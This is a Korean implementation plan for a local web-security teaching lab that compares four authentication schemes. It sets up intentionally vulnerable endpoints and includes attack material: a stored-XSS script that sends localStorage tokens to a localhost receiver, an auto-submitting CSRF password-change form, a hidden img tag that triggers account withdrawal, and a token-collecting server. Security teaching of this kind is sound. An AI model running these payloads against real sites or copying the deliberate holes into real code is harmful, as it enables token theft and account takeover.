# Auth-Lab 구현 계획 (plan.md)

> 각 단계는 독립적으로 실행 가능하도록 설계합니다.
> 완료된 항목은 `- [x]`로 표시합니다.

---

## Phase 0: 프로젝트 초기 세팅

### 0-1. 디렉토리 구조 생성
- [x] `auth-lab/client/` — Next.js 14 프로젝트
- [x] `auth-lab/server/` — NestJS 프로젝트
- [x] `auth-lab/hacker/` — 공격용 정적 파일
- [x] `auth-lab/docker/` — Docker Compose 설정

### 0-2. Docker 환경
- [x] `docker-compose.yml` 작성 (PostgreSQL 15 + pgAdmin)
- [x] `.env.example` 작성

### 0-3. NestJS 프로젝트 생성
- [x] `nest new server --package-manager npm`
- [x] 패키지 설치 (typeorm, passport, jwt, session, cookie-parser, bcrypt 등)
- [x] `.env` 파일 생성

### 0-4. Next.js 프로젝트 생성
- [x] `create-next-app` (TypeScript + Tailwind + App Router)
- [x] 패키지 설치 (axios, zustand, tanstack-query, zod, react-hook-form)
- [x] root `.gitignore` 생성 (node_modules 차단)

### 0-5. Client 기반 인프라 구현 (SRP + Exception_Handling 컨벤션)
- [x] `lib/http/publicApi.ts` — 로그인/refresh 전용 axios 인스턴스
- [x] `lib/http/privateApi.ts` — AT 주입 + 401 refresh 인터셉터
- [x] `components/common/error/ErrorBoundary.tsx` — [Global] 범용 클래스 boundary
- [x] `components/common/error/QueryErrorBoundary.tsx` — QueryErrorResetBoundary 합성
- [x] `components/common/error/GlobalErrorFallback.tsx` — 전체화면 에러 UI
- [x] `components/common/error/PageErrorView.tsx` — [Page] safety net 에러 UI
- [x] `components/common/loading/PageLoadingView.tsx` — [Page] 스피너
- [x] `components/common/empty/EmptyBoundary.tsx` — 빈 데이터 fallback
- [x] `layouts/PageAsyncBoundary.tsx` — QueryErrorBoundary + Suspense 합성
- [x] `providers/QueryProvider.tsx` — QueryClient (throwOnError 설정)
- [x] `app/layout.tsx` — GlobalErrorBoundary + QueryProvider 연결

---

## Phase 1: NestJS 서버 — DB 및 공통 모듈

### 1-1. TypeORM 설정
- [ ] `app.module.ts`에 TypeORM 연결 (host: localhost, port: 5432)
- [ ] `synchronize: true` (개발 환경)

### 1-2. User 엔티티 정의
```typescript
@Entity()
export class User {
  @PrimaryGeneratedColumn('uuid') id: string;
  @Column({ unique: true })       email: string;
  @Column()                       password: string;  // bcrypt
  @Column({ default: 0 })         points: number;
  @Column({ type: 'enum', enum: Role, default: Role.USER }) role: Role;
  @Column({ default: false })     isWithdrawn: boolean;
}
```
- [ ] `Role` enum: `USER | ADMIN`

### 1-3. Post 엔티티 정의
```typescript
@Entity()
export class Post {
  @PrimaryGeneratedColumn()    id: number;
  @Column()                    title: string;
  @Column('text')              content: string;  // XSS 스크립트 저장됨 (의도적)
  @ManyToOne(() => User)       author: User;
}
```

### 1-4. Seed 데이터
- [ ] `SeedService` 또는 `OnModuleInit` 훅으로 서버 시작 시 자동 삽입
  - `victim@test.com` / `victim1234` / points: 1,000,000
  - `hacker@test.com` / `hacker1234` / points: 0
  - `admin@test.com` / `admin1234` / points: 0
  - XSS 게시글: 제목 "초특가 세일!", 내용 `<script>fetch('http://localhost:4999/steal?t=' + localStorage.getItem('at'))</script>`

### 1-5. 공통 API 모듈
- [ ] `PostsModule` — 게시글 CRUD (`GET /api/posts`, `POST /api/posts`)
- [ ] `PointsModule` — 포인트 송금 (`POST /api/points/transfer`)
- [ ] `UserModule` — 비밀번호 변경, 회원 탈퇴

---

## Phase 2: NestJS 서버 — 4가지 인증 방식 구현

> 각 버전은 `/auth/v1`, `/auth/v2`, `/auth/v3`, `/auth/v4` prefix로 분리

### 2-1. V1: JWT → Body 응답 (LocalStorage 방식)

**서버 동작:**
- [ ] `POST /auth/v1/login` — 이메일/비밀번호 검증 후 `{ accessToken }` JSON 응답
- [ ] `GET /auth/v1/me` — `Authorization: Bearer {token}` 헤더에서 JWT 검증
- [ ] CORS: `origin: 'http://localhost:3000'`, `credentials: false`

```typescript
// 응답 형태
return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) };
```

**취약점 설계:**
- [ ] `POST /api/points/transfer` — `Authorization` 헤더의 JWT로 인증 (훔친 토큰으로 호출 가능)
- [ ] CORS `Access-Control-Allow-Origin: *` 설정 (의도적 취약점)

---

### 2-2. V2: express-session (Session Cookie 방식)

**서버 동작:**
- [ ] `main.ts`에 `express-session` 미들웨어 설정:
  ```typescript
  app.use(session({
    secret: 'session-secret',
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true, sameSite: 'lax' }  // ← Strict 아님 (취약점)
  }));
  ```
- [ ] `POST /auth/v2/login` — `req.session.userId = user.id` 저장
- [ ] `POST /auth/v2/logout` — `req.session.destroy()`
- [ ] CORS: `origin: 'http://localhost:3000'`, `credentials: true`

**취약점 설계 (CSRF):**
- [ ] `POST /api/user/update-password` — `oldPassword` 확인 **없이** `newPassword`만 받아서 변경
  - 세션으로 사용자 식별
  - CSRF 토큰 **없음** (의도적)

---

### 2-3. V3: JWT → HttpOnly Cookie (SameSite=Lax)

**서버 동작:**
- [ ] `POST /auth/v3/login` — JWT를 쿠키로 설정:
  ```typescript
  res.cookie('at', accessToken, {
    httpOnly: true,
    secure: false,      // 로컬 환경 (HTTPS 없음)
    sameSite: 'lax',   // ← Strict 아님 (취약점)
  });
  ```
- [ ] `GET /auth/v3/me` — 쿠키에서 JWT 추출 후 검증

**취약점 설계 (GET CSRF):**
- [ ] `GET /api/user/withdraw` — **GET 방식으로** `isWithdrawn = true` 처리
  - `SameSite=Lax`는 동일 사이트 내 GET은 쿠키 전송
  - 게시판의 `<img>` 태그로 호출 가능

---

### 2-4. V4: Hybrid Refresh Token (안전한 방식)

**서버 동작:**
- [ ] `POST /auth/v4/login` — Access Token(Body) + Refresh Token(Cookie) 이중 응답:
  ```typescript
  // Access Token: 15분 만료, JSON Body
  const accessToken = this.jwtService.sign({ sub: user.id }, { expiresIn: '15m' });
  // Refresh Token: 7일 만료, HttpOnly + SameSite=Strict 쿠키
  const refreshToken = this.jwtService.sign({ sub: user.id }, { expiresIn: '7d', secret: RT_SECRET });
  res.cookie('rt', refreshToken, {
    httpOnly: true,
    secure: false,
    sameSite: 'strict',  // ← Strict (외부 사이트에서 쿠키 미전송)
  });
  return { accessToken };
  ```
- [ ] `POST /auth/v4/refresh` — RT 쿠키 검증 후 새 AT 발급
- [ ] `POST /auth/v4/logout` — RT 쿠키 삭제
- [ ] 모든 V4 API: `Authorization: Bearer {at}` 헤더로만 인증 (쿠키 인증 없음)

**방어 확인:**
- [ ] XSS 시도 시: `localStorage` 비어있음, 메모리 변수 접근 불가
- [ ] CSRF 시도 시: 헤더에 AT 없으면 401

---

## Phase 3: NestJS 서버 — 공격 대상 API 완성

### 3-1. 포인트 송금 (`POST /api/points/transfer`)
```typescript
// 요청 Body
{ toEmail: string, amount: number }

// 로직
1. Authorization 헤더 또는 세션/쿠키에서 현재 사용자 식별
2. 현재 사용자 points -= amount
3. 수신자 points += amount
4. 두 사용자 저장 (트랜잭션)
5. 응답: { from: { email, points }, to: { email, points } }
```
- [ ] V1 전용: JWT Bearer 헤더 인증 (훔친 토큰으로 호출 가능)
- [ ] 잔액 부족 시 400 에러

### 3-2. 비밀번호 변경 (`POST /api/user/update-password`)
```typescript
// 요청 Body (취약 버전)
{ newPassword: string }  // oldPassword 없음 → CSRF 취약

// 로직
1. 세션(V2)으로 사용자 식별
2. bcrypt.hash(newPassword) 저장
3. 응답: { message: '비밀번호가 변경되었습니다.' }
```
- [ ] V2 전용: 세션 쿠키 인증
- [ ] `oldPassword` 검증 **없음** (의도적 취약점)

### 3-3. 회원 탈퇴 (`GET /api/user/withdraw`)
```typescript
// GET 방식 (의도적 취약 설계)
// 로직
1. 쿠키(V3)에서 JWT 추출
2. user.isWithdrawn = true 업데이트
3. 응답: { message: '탈퇴되었습니다.' }
```
- [ ] V3 전용: HttpOnly 쿠키 JWT 인증
- [ ] GET 방식 유지 (img 태그 공격 허용)

---

## Phase 4: 공격 도구 (`hacker/` 디렉토리)

### 4-1. XSS 토큰 수신 서버
- [ ] `hacker/xss-receiver.js` — Node.js HTTP 서버 (port 4999)
  ```javascript
  // GET /steal?t=... 로 토큰 수신
  // 수신된 토큰을 콘솔 및 토큰 로그 파일에 기록
  // GET /tokens 로 수신된 토큰 목록 조회
  ```

### 4-2. CSRF 공격 페이지 (2단계)
- [ ] `hacker/csrf-stage2.html` — 비밀번호 변경 CSRF (port 5000에서 서빙)
  ```html
  <!-- 자동 제출 폼 -->
  <form id="attack" action="http://localhost:4002/api/user/update-password" method="POST">
    <input type="hidden" name="newPassword" value="hacker1234!">
  </form>
  <script>document.getElementById('attack').submit();</script>
  ```

### 4-3. GET CSRF 공격 시뮬레이터 (3단계)
- [ ] `hacker/csrf-stage3.html` — 이미지 태그 공격 (port 5000에서 서빙)
  ```html
  <!-- 이미지 로딩 시 탈퇴 API 호출 -->
  <img src="http://localhost:4003/api/user/withdraw" style="display:none">
  ```

### 4-4. Hacker 서버 정적 파일 서빙
- [ ] `hacker/server.js` — express로 포트 5000에서 정적 파일 서빙

---

## Phase 5: Next.js 클라이언트

### 5-1. 앱 기본 구조
```
client/app/
├── layout.tsx              ← 최상위 레이아웃 (인증 탭 포함)
├── page.tsx                ← 메인 페이지
├── (auth)/
│   └── login/page.tsx      ← 로그인 페이지 (탭별 전환)
├── dashboard/page.tsx      ← 로그인 후 대시보드 (포인트, 프로필)
├── posts/page.tsx          ← 게시판 (XSS 콘텐츠 렌더링)
└── attack/page.tsx         ← 공격 시뮬레이션 패널 (학습용)
```

### 5-2. 인증 방식 탭 전환
- [ ] `AuthModeStore (Zustand)` — 선택된 인증 방식 저장 (`v1` | `v2` | `v3` | `v4`)
- [ ] Axios 인터셉터: 선택된 방식에 따라 baseURL 및 Authorization 헤더 스위칭
  ```typescript
  // v1: localStorage에서 토큰 읽어 헤더 삽입
  // v2: withCredentials: true, 헤더 없음
  // v3: withCredentials: true, 헤더 없음
  // v4: Zustand 메모리에서 AT 읽어 헤더 삽입
  ```

### 5-3. V1: LocalStorage 인증 흐름
- [ ] 로그인 후 `localStorage.setItem('at', accessToken)`
- [ ] 모든 API 요청: `Authorization: Bearer ${localStorage.getItem('at')}`
- [ ] 대시보드에 현재 저장된 토큰 표시 (공격 시각화용)

### 5-4. V2: 세션 쿠키 흐름
- [ ] 로그인 요청: `axios.post('/auth/v2/login', { ... }, { withCredentials: true })`
- [ ] 별도 토큰 저장 없음 — 쿠키 자동 관리

### 5-5. V3: HttpOnly 쿠키 흐름
- [ ] V2와 동일 (`withCredentials: true`)
- [ ] 개발자 도구 → Application → Cookies에서 `at` 쿠키 확인 (HttpOnly라 JS 접근 불가)

### 5-6. V4: Hybrid Refresh 흐름
- [ ] `AuthStore (Zustand)`: `accessToken` 메모리 변수
- [ ] 로그인 후: `setAccessToken(res.data.accessToken)`
- [ ] `useRefresh` 훅: 앱 초기화 시 `POST /auth/v4/refresh` 호출해 AT 복구
- [ ] Axios 인터셉터: `{ headers: { Authorization: 'Bearer ${accessToken}' } }`
- [ ] 401 응답 시 자동 Refresh → 재시도 (Silent Refresh)

### 5-7. 게시판 페이지 (XSS 체험용)
- [ ] 게시글 목록을 렌더링할 때 `dangerouslySetInnerHTML` 사용 (취약 버전)
- [ ] 안전 버전: `DOMPurify` 적용 후 비교

### 5-8. 공격 시뮬레이션 패널 (`/attack`)
각 단계별 공격 방법을 UI로 제공:
- [ ] **1단계**: "XSS 공격 실행" 버튼 → localStorage 읽기 스크립트 실행 + 결과 표시
- [ ] **2단계**: "CSRF 공격 페이지로 이동" 버튼 → localhost:5000/csrf-stage2.html
- [ ] **3단계**: "악성 게시글 작성" → img 태그 포함 게시글 등록
- [ ] **4단계**: 위 공격들 시도 후 차단됨을 확인

---

## Phase 6: 통합 테스트 시나리오

### 시나리오 A: 1단계 공격 전체 흐름
```
1. victim으로 V1 로그인 → localStorage에 AT 저장 확인
2. XSS 게시글 클릭 → hacker 서버(4999)에 토큰 수신 확인
3. 새 시크릿 창에서 localStorage에 훔친 토큰 직접 주입
4. /api/points/transfer 호출 → victim 잔액 0, hacker 잔액 1,000,000 확인
```

### 시나리오 B: 2단계 공격 전체 흐름
```
1. victim으로 V2 로그인 (세션 쿠키 발급)
2. 같은 브라우저에서 localhost:5000/csrf-stage2.html 접속
3. 폼 자동 제출 → victim 비밀번호 변경됨
4. 로그아웃 후 기존 비밀번호로 로그인 시도 → 실패 확인
5. 변경된 비밀번호(hacker1234!)로 로그인 → 성공 확인
```

### 시나리오 C: 3단계 공격 전체 흐름
```
1. victim으로 V3 로그인 (HttpOnly 쿠키 발급)
2. 공격자가 악성 게시글 작성 (<img src="http://localhost:4003/api/user/withdraw">)
3. victim이 게시판 접속 (이미지 로딩)
4. DB에서 victim.isWithdrawn = true 확인
5. victim 로그인 시도 → "탈퇴된 계정" 에러 확인
```

### 시나리오 D: 4단계 방어 확인
```
1. victim으로 V4 로그인
2. 1단계 공격: localStorage 확인 → 비어있음
3. 2단계 공격: CSRF 폼 제출 → Authorization 헤더 없음 → 401
4. 3단계 공격: img GET 요청 → /auth/v4/withdraw는 DELETE 방식 + Bearer 헤더 필요 → 차단
5. 공격 전부 실패 확인
```

---

## 실행 명령어 요약

```bash
# 1. DB 실행
cd auth-lab
docker-compose up -d

# 2. 서버 실행
cd server
npm run start:dev

# 3. 클라이언트 실행
cd client
npm run dev

# 4. 공격 도구 실행
cd hacker
node xss-receiver.js    # port 4999: XSS 토큰 수신
node server.js          # port 5000: CSRF 공격 페이지 서빙
```

---

## 구현 우선순위 (MVP 기준)

1. **[필수]** Phase 0: Docker + DB 세팅
2. **[필수]** Phase 1: DB 스키마 + Seed 데이터
3. **[필수]** Phase 2-1: V1 JWT/LocalStorage 서버
4. **[필수]** Phase 3-1: 포인트 송금 API
5. **[필수]** Phase 4-1: XSS 토큰 수신 서버
6. **[필수]** Phase 5-1 ~ 5-3: Next.js 기본 + V1 흐름
7. **[권장]** Phase 2-2 ~ 2-4: V2, V3, V4 서버
8. **[권장]** Phase 5-4 ~ 5-8: 나머지 클라이언트 기능
9. **[선택]** Phase 6: 통합 테스트 시나리오 문서화

---

## 참고: 핵심 보안 설정 비교

```typescript
// V1: 취약 (XSS)
return { accessToken };  // Body로 반환 → localStorage 저장

// V2: 취약 (CSRF)
cookie: { httpOnly: true, sameSite: 'lax' }  // CSRF 토큰 없음

// V3: 부분 취약 (GET CSRF)
res.cookie('at', jwt, { httpOnly: true, sameSite: 'lax' })
// + GET 방식 탈퇴 API 설계

// V4: 안전
res.cookie('rt', refreshToken, { httpOnly: true, sameSite: 'strict' })
// + 모든 API: Authorization Bearer 헤더 필수
```
